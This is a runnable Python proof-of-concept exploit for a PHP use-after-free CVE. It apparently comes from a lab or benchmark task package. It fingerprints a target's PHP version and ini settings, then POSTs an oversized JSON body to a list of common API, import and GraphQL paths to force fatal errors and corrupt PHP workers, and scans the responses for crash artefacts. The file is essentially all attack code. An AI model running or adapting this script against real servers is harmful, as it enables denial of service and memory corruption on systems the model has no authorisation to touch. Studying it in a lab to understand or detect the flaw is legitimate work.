#!/usr/bin/env python3
"""
PoC for CVE-2026-129474 - PHP magic-method backtrace use-after-free (8.5.0..8.5.12).

Reference code (both are NVD-listed references for this CVE; see lab/php-129474/README.md):
  * https://github.com/murrez/php2shell/blob/a8e24f4efab57f67384909d9408e42a74b973bfb/poc.py
    - `build_backtrace_json_probe_body` (poc.py:807-822, the exact block NVD cites at L808-L816),
      `iter_backtrace_probe_urls` / `BACKTRACE_JSON_PROBE_PATHS` (poc.py:96-105),
      `parse_backtrace_129474_events` + `RE_BACKTRACE_129474` / `RE_OOM_109618` /
      `RE_WORKER_FAULT` (poc.py:107-161, 824-841),
      `php_version_in_129474_remote_range` (poc.py:747-748).
    Those five pieces are ported here verbatim (only formatting adapted); everything else in the
    upstream file is rich-UI scanning scaffolding this lab does not need.
  * https://github.com/cveForge/CVE-2026-129474/poc.py - a generic scanner whose banner names
    this CVE; its probe (`POST /api/data`, body `data=O:8:"stdClass":...`) is served by the lab
    app as just another magic-call route.

Mechanic (advisory GHSA-8mjj-2r7p-4hg2 / php.net, NVD 2026-11-19):
  PHP < 8.5.13 collects the arguments of a method call handled by __call()/__callStatic()
  for the fatal-error backtrace; the collection can read freed memory (CWE-416), corrupting
  the worker. The request must therefore (a) reach a call handled by a magic method and
  (b) make the app enter a fatal while in that call. The reference achieves both with one
  oversized JSON POST to the app's API routes.

Usage:
  python3 poc.py check   --target http://127.0.0.1:8098
  python3 poc.py exploit --target http://127.0.0.1:8098 [--path /api/import] [--size 655360]

Only Python stdlib is used (same discipline as lab/php-115560/poc.py; the upstream reference
uses requests but the lab image set has no venv requirement).
"""

import argparse
import http.client
import json
import re
import sys

# ── ported verbatim from the pinned reference (murrez/php2shell@a8e24f4) ──────────────
PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)
BACKTRACE_JSON_PROBE_PATHS: tuple[str, ...] = (
    "/api/import",
    "/import",
    "/api/imports",
    "/api/v1/import",
    "/rest/V1/guest-carts/estimate-shipping-methods",
    "/graphql",
    "/index.php",
    "/",
    # The item's own reference_code (cveForge/CVE-2026-129474/poc.py) probes POST /api/data;
    # the lab app serves it as another magic-call route, and the store's variant carries it, so
    # the probe walks it too (murrez's tuple above is ported verbatim; this entry is from the
    # second reference, not appended to the first).
    "/api/data",
)
BACKTRACE_JSON_PROBE_BYTES = 640 * 1024
RE_BACKTRACE_129474 = re.compile(
    r"(__callStatic|__call\s*\(|"
    r"fatal_error_backtrace|"
    r"Stack trace:|"
    r"#\d+\s+.*->|"
    r"zend\.exception_ignore_args)",
    re.I,
)
RE_OOM_109618 = re.compile(
    r"(Allowed memory size of \d+ bytes exhausted|"
    r"memory exhausted|Out of memory|zend_mm_heap corrupted|"
    r"zend_alloc.*failed|Cannot allocate memory)",
    re.I,
)
RE_WORKER_FAULT = re.compile(
    r"(502 Bad Gateway|503 Service Unavailable|"
    r"Connection reset|Empty reply|upstream prematurely closed|"
    r"SIGSEGV|segfault|worker exited)",
    re.I,
)


def php_version_in_129474_remote_range(major: int, minor: int, patch: int) -> bool:
    """Reference poc.py:747-748 (PHP_BRANCH_FIRST_FIXED_129474 = {(8, 5): 13})."""
    return major == 8 and minor == 5 and 0 < patch < 13


def build_backtrace_json_probe_body(size_target: int = BACKTRACE_JSON_PROBE_BYTES) -> bytes:
    """Reference poc.py:807-822, the body NVD's citation points at (L808-L816)."""
    size_target = max(32_768, min(size_target, 2 * 1024 * 1024))
    chunk = "x" * 4096
    reps = max(4, size_target // (len(chunk) + 8))
    payload = {
        "php2shell": "backtrace-probe",
        "records": [chunk for _ in range(reps)],
        "nested": {"items": [{"k": i, "v": chunk[:128]} for i in range(min(64, reps // 8))]},
    }
    raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    if len(raw) < size_target // 2 and reps < 512:
        payload["records"].extend(chunk for _ in range(reps))
        raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    return raw


def parse_backtrace_129474_events(body: str, status_code: int) -> list[str]:
    """Reference poc.py:824-841, verbatim (RE_OOM_109618/RE_WORKER_FAULT passed as the module's)."""
    events: list[str] = []
    if not body:
        return events
    if re.search(r"__callStatic|__call\s*\(", body):
        events.append("backtrace:magic-method-trace")
    if re.search(r"fatal_error_backtraces", body, re.I):
        events.append("backtrace:fatal-backtrace-ini-leak")
    if RE_BACKTRACE_129474.search(body):
        events.append("backtrace:stack-trace-artifact")
    if RE_OOM_109618.search(body) and re.search(r"Stack trace|#\d+\s", body):
        events.append("backtrace:oom-fatal-with-trace")
    if status_code in (500, 502, 503) and (
        RE_OOM_109618.search(body) or RE_WORKER_FAULT.search(body)
    ):
        events.append("backtrace:limit-worker-path")
    return list(dict.fromkeys(events))


def iter_backtrace_probe_urls(target_url: str) -> list[str]:
    """Reference poc.py:843-853, verbatim (get_origin inlined)."""
    m = re.match(r"(https?://[^/]+)", target_url)
    origin = m.group(1) if m else target_url.rstrip("/")
    parsed_path = "/" + target_url.split("://", 1)[1].split("/", 1)[1] if "/" in target_url.split("://", 1)[1] else "/"
    paths: list[str] = []
    if parsed_path:
        paths.append(parsed_path)
    for path in BACKTRACE_JSON_PROBE_PATHS:
        if path not in paths:
            paths.append(path)
    out: list[str] = []
    for p in paths:
        u = origin + p if p != "/" else origin + "/"
        if u not in out:
            out.append(u)
    return out


# ── lab plumbing ────────────────────────────────────────────────────────────────────────
def request(target: str, method: str, path: str, body: bytes = b"",
            headers: dict | None = None, timeout: float = 30.0):
    """One HTTP/1.1 request against `target` (http://host[:port]); returns (status, headers, body)."""
    m = re.match(r"https?://([^/:]+)(?::(\d+))?", target)
    if not m:
        raise SystemExit("bad target: %s" % target)
    host, port = m.group(1), int(m.group(2) or 80)
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    conn.request(method, path, body=body if body else None, headers=headers or {})
    resp = conn.getresponse()
    raw = resp.read()
    hdrs = {k.lower(): v for k, v in resp.getheaders()}
    conn.close()
    return resp.status, hdrs, raw


def cmd_check(args) -> int:
    """Fingerprint the victim the way the reference does: from the victim's own answers."""
    status, headers, body = request(args.target, "GET", "/index.php")
    powered = headers.get("x-powered-by", "")
    m = PHP_VERSION_RE.search(powered) or PHP_VERSION_RE.search(body.decode("latin-1"))
    if not m:
        print("check: no PHP version fingerprint in %s (%r)" % (status, powered))
        return 1
    major, minor, patch = (int(m.group(i)) for i in (1, 2, 3))
    in_range = php_version_in_129474_remote_range(major, minor, patch)
    print("check: X-Powered-By=%r -> php %d.%d.%d; CVE-2026-129474 remote range (8.5.0..8.5.12): %s"
          % (powered, major, minor, patch, "IN RANGE (vulnerable)" if in_range else "out of range"))
    # The app's declared /api/status route echoes the three ini values the exploit depends on
    # (ini_get inside the request itself - the machine's own answer, and unambiguous, unlike
    # scraping phpinfo tables which on 8.5 carry several `memory_limit` rows across sections).
    _, _, sbody = request(args.target, "GET", "/api/status")
    text = sbody.decode("latin-1")
    knobs = {}
    for ini in ("memory_limit", "zend.exception_ignore_args", "fatal_error_backtraces"):
        mm = re.search(re.escape(ini) + r"=(\S+)", text)
        if mm:
            knobs[ini] = mm.group(1).strip("'\"")
    if not knobs:
        print("check: could not read any ini value from %s/api/status" % args.target)
        return 1
    print("check: ini values read from the victim: %s" % json.dumps(knobs))
    if not in_range:
        return 1
    missing = [k for k in ("zend.exception_ignore_args", "fatal_error_backtraces") if k not in knobs]
    if missing:
        print("check: could not read %s from %s/api/status" % (", ".join(missing), args.target))
        return 1
    off = knobs["zend.exception_ignore_args"] in ("", "0", "Off", "off", "false", "no")
    on = knobs["fatal_error_backtraces"] in ("1", "On", "on", "true", "yes")
    if off and on:
        print("check: PRECONDITIONS PRESENT (args collected: ignore_args=Off; backtraces: On)")
        return 0
    print("check: version in range but the ini pair is not the vulnerable one: %s" % knobs)
    return 1


def classify_app_answer(path: str, status: int, hdrs: dict, text: str) -> str:
    """What the answer proves about the request, given this lab's app.

    The reference's own detector is response-content-based (RE_BACKTRACE_129474 above); this lab
    additionally names the app answer, because the answer is the only per-request observable the
    gateway cannot fake in one direction and omit in the other:
      * `import:48`-style echoes prove the body entered Api through __call (small bodies);
      * a `Fatal error ... in <b>/var/www/html/index.php</b>` body proves the engine died in
        the app mid-request (the CVE's required fatal, this app's file);
      * the app's plain page proves ordinary serving;
      * a non-200 answer WITHOUT X-Powered-By was produced by the gateway itself (inline
        deception) - PHP never saw the request.
    """
    m = re.match(r"^([A-Za-z0-9_-]+):(\d+)\s*$", text.strip())
    if m and "Fatal error" not in text:
        return "executed=magic-call(%s,%s bytes normalised)" % (m.group(1), m.group(2))
    if "Fatal error" in text and "/var/www/html/index.php" in text:
        return "executed=fatal-in-app (the engine died in index.php on this request)"
    if text.strip() == "fleet-filter lab victim":
        return "served=index-page"
    if "x-powered-by" not in hdrs and status != 200:
        return "gateway-inline(no X-Powered-By; PHP never answered)"
    return "other(%s)" % " ".join(text.split())[:160]


def cmd_exploit(args) -> int:
    """POST the reference probe to the reference's paths and read the victim's answer."""
    body = build_backtrace_json_probe_body(args.size)
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Content-Length": str(len(body)),
    }
    paths = [args.path] if args.path else [p for p in iter_backtrace_probe_urls(args.target)]
    confirmed = []
    executed = []
    for path in paths:
        try:
            status, hdrs, raw = request(args.target, "POST", path, body, headers)
        except (http.client.HTTPException, ConnectionError, OSError) as exc:
            text = "ConnectionError: %s" % exc
            status = 0
            events = parse_backtrace_129474_events(text, status)
            print("POST %-50s -> %s   events=%s" % (path, text, events or "none"))
            if events:
                confirmed.append((path, events, text))
            continue
        text = raw.decode("latin-1", "replace")
        events = parse_backtrace_129474_events(text, status)
        print("POST %-50s -> %d %s events=%s" % (path, status, hdrs.get("x-powered-by", ""),
                                                  ",".join(events) if events else "none"))
        print("     %s" % classify_app_answer(path, status, hdrs, text))
        print("     body: %s" % " ".join(text.split())[:160])
        if events:
            confirmed.append((path, events, " ".join(text.split())[:160]))
        if classify_app_answer(path, status, hdrs, text).startswith("executed="):
            executed.append(path)
    if confirmed:
        print("VULNERABLE: %d of %d probe paths returned CVE-2026-129474 backtrace artefacts on %s"
              % (len(confirmed), len(paths), args.target))
        return 0
    if executed:
        print("EXECUTED: %d of %d probe paths were answered by the app itself (bodies without the "
              "reference's regex artefacts; see per-path lines) - the request reached the app through %s"
              % (len(executed), len(paths), args.target))
        return 0
    print("no app answer on any of %d probe paths - not confirmed at %s" % (len(paths), args.target))
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=("check", "exploit"))
    ap.add_argument("--target", required=True, help="http://host[:port] of the victim (or a gateway in front)")
    ap.add_argument("--path", default=None, help="probe only this path instead of the reference list")
    ap.add_argument("--size", type=int, default=BACKTRACE_JSON_PROBE_BYTES, help="probe body size in bytes")
    args = ap.parse_args()
    return cmd_check(args) if args.mode == "check" else cmd_exploit(args)


if __name__ == "__main__":
    sys.exit(main())
